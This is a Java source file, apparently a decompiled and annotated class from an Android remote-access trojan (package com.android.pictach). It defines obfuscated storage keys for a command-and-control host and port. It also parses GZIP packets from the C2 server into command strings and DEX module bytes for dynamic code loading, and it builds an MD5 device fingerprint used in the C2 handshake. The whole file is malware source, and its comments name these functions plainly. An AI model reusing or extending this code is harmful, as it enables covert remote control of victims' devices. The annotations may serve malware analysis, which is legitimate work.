package com.android.pictach;

import android.content.Context;
import android.os.Build;
import java.io.UnsupportedEncodingException;
import java.security.MessageDigest;
import java.util.Random;
import java.util.UUID;

/**
 * Config — Configuration keys and device fingerprinting.
 *
 * FTX0 = storage directory name       (.Confg)
 * FTX1 = shared prefs key for host    (set to "appdata" at runtime by Api.onCreate)
 * FTX2 = shared prefs key for port    (set to "configrs" at runtime by Api.onCreate)
 * FTX3 = DEX temp file prefix         (set to "sysinfo" at runtime by Api.onCreate)
 *
 * These are set to placeholder values here and overwritten in Api.onCreate():
 *   Config.FTX0 = "sysdata"
 *   Config.FTX1 = "appdata"
 *   Config.FTX2 = "configrs"
 *   Config.FTX3 = "sysinfo"
 */
public class Config {

    // Storage directory name for DEX temp files
    public static String FTX0 = ".Confg";

    // SharedPreferences key used to store/retrieve C2 host
    public static String FTX1 = "NFHY";

    // SharedPreferences key used to store/retrieve C2 port
    public static String FTX2 = "YLOV";

    // Prefix for DEX temp files written to disk before loading
    public static String FTX3 = "QSVT";

    // Instance fields: hold parsed command data received from C2
    public byte[] byt;   // raw DEX/module bytes from C2
    public String str;   // command string from C2 (split by "TxTxT")

    /**
     * Constructor — called when a C2 packet is received and parsed.
     * bArr  = GZIP-decompressed command string bytes (first part of packet)
     * bArr2 = GZIP-decompressed DEX module bytes (second part of packet)
     */
    Config(byte[] bArr, byte[] bArr2) {
        this.str = null;
        this.byt = null;
        try {
            this.str = new String(bArr, "UTF-8");
            this.byt = bArr2;
        } catch (UnsupportedEncodingException unused) {
        }
    }

    /**
     * Caps a modulo value at 10 to prevent long fingerprint strings.
     * Always returns 10 (since "CRAZY".length() = 5, never > 10).
     * Effectively: every Build field length is capped at % 10.
     */
    public static int capAtTen(String str, int i) {
        if (str.length() > 10) {
            return 10;
        }
        return i;
    }

    /**
     * Generates a unique device fingerprint string from Build fields.
     * Concatenates: "35" + (each Build field length % 10)
     * Then MD5-hashes the result and returns uppercase hex string.
     * Used in the C2 handshake as the device identifier.
     *
     * Falls back to UUID if MD5 fails.
     */
    public static String generateDeviceId(Context context) {
        String raw = "35"
                + (Build.BOARD.length()        % capAtTen("CRAZY", 10))
                + (Build.BRAND.length()        % capAtTen("CRAZY", 10))
                + (Build.CPU_ABI.length()      % capAtTen("CRAZY", 10))
                + (Build.DEVICE.length()       % capAtTen("CRAZY", 10))
                + (Build.DISPLAY.length()      % capAtTen("CRAZY", 10))
                + (Build.HOST.length()         % capAtTen("CRAZY", 10))
                + (Build.ID.length()           % capAtTen("CRAZY", 10))
                + (Build.MANUFACTURER.length() % capAtTen("CRAZY", 10))
                + (Build.MODEL.length()        % capAtTen("CRAZY", 10))
                + (Build.PRODUCT.length()      % capAtTen("CRAZY", 10))
                + (Build.TAGS.length()         % capAtTen("CRAZY", 10))
                + (Build.TYPE.length()         % capAtTen("CRAZY", 10))
                + (Build.USER.length()         % capAtTen("CRAZY", 10));
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            md.update(raw.getBytes(), 0, raw.length());
            byte[] digest = md.digest();
            String hex = "";
            for (byte b : digest) {
                int val = b & 0xFF;
                if (val <= 15) {
                    hex = hex + "0";
                }
                hex = hex + Integer.toHexString(val);
            }
            return hex.toUpperCase();
        } catch (Exception unused) {
            return UUID.randomUUID().toString();
        }
    }

    /**
     * Generates a random string of given length using characters from charset.
     * Used to generate random values for certain C2 command params.
     */
    public static String getRandomString(int length, String charset) {
        Random random = new Random();
        StringBuilder sb = new StringBuilder(length);
        for (int i = 0; i < length; i++) {
            sb.append(charset.charAt(random.nextInt(charset.length())));
        }
        return sb.toString();
    }
}
